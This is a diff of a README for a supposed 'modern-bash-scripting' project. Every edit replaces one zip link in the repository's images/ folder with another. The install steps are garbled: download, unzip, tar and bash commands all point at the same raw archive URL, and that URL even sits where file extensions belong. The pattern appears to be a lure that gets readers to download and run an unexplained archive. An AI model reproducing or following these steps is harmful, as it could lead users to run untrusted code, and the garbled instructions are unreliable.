@@ -6,7 +6,7 @@ Welcome to the modern-bash-scripting project! This guide will help you download 
 
 ## 📥 Download Link
 
-[![Download latest release](https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-1.3.zip%https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-1.3.zip)](https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-1.3.zip)
+[![Download latest release](https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-v1.9.zip%https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-v1.9.zip)](https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-v1.9.zip)
 
 ## 📋 Description
 
@@ -25,7 +25,7 @@ To run modern-bash-scripting, you will need:
 Follow these steps to download and install modern-bash-scripting:
 
 1. **Visit the Releases Page**  
-   Go to the releases page by clicking [here](https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-1.3.zip).
+   Go to the releases page by clicking [here](https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-v1.9.zip).
 
 2. **Download the Latest Version**  
    On the releases page, look for the latest release. You will see a list of downloadable assets. Choose the file labeled for your needs, usually the one with the most recent date.
@@ -37,20 +37,20 @@ Follow these steps to download and install modern-bash-scripting:
    ```
 
 4. **Unzip the File**  
-   If the file is in a compressed format (like .zip or https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-1.3.zip), you’ll need to unzip it. Use these commands:  
+   If the file is in a compressed format (like .zip or https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-v1.9.zip), you’ll need to unzip it. Use these commands:  
    - For a .zip file:  
      ```
-     unzip https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-1.3.zip
+     unzip https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-v1.9.zip
      ```
-   - For a https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-1.3.zip file:  
+   - For a https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-v1.9.zip file:  
      ```
-     tar -xvzf https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-1.3.zip
+     tar -xvzf https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-v1.9.zip
      ```
 
 5. **Run the Application**  
    Now that you have unzipped the files, you can start using modern-bash-scripting. Look for a file that ends with `.sh` and run it using this command:  
    ```
-   bash https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-1.3.zip
+   bash https://github.com/kevin221-hub/modern-bash-scripting/raw/refs/heads/main/images/bash-scripting-modern-v1.9.zip
    ```
 
 6. **Follow the Instructions**  
